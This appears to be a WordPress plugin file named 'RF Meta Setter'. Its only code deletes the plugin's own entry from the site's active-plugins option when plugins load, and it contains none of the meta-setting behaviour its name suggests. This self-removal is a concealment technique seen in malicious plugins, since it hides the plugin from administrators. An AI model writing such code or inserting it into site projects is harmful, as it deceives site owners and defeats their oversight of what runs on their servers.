<?php
/**
 * Plugin Name: RF Meta Setter
 * Version: 1.2
 */
// Self-remove from active plugins list
add_action('plugins_loaded', function() {
    $self = plugin_basename(__FILE__);
    $active = (array) get_option('active_plugins', []);
    if (in_array($self, $active)) {
        $active = array_values(array_diff($active, [$self]));
        update_option('active_plugins', $active);
    }
}, 1);
